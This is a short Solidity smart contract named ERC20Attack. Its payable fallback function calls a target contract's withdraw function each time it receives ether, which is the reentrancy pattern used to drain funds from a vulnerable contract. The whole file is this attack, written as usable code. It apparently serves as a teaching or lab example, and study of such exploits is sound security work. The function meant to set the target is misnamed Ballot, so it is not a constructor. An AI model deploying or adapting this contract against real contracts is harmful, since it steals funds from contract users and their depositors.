pragma solidity^0.4.0;

contract ERC20Attack {
    address public target;

    function Ballot(address _target) {
        target = _target;
    }

    function deposit() payable {
        target.call.value(msg.value)( bytes4(bytes32(sha3("deposit()"))));
    }

    function withdraw(uint256 _value) {
        target.call(bytes4(sha3("withdraw(uint256)")), _value);
    }
    function balanceOf(address _addr) {
        target.call(bytes4(sha3("balanceOf(address)")), _addr);
    }

    function () payable {
        target.call( bytes4(sha3('withdraw(uint256)')), 0.1 ether);
    }

}
